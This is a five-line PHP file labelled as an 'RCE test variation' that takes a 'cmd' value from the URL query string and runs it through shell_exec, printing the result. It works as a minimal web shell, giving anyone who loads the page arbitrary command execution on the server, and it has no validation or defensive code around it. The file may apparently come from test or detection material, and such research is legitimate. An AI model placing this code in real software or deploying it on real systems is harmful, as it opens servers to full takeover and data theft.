<?php
// RCE test variation #592
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>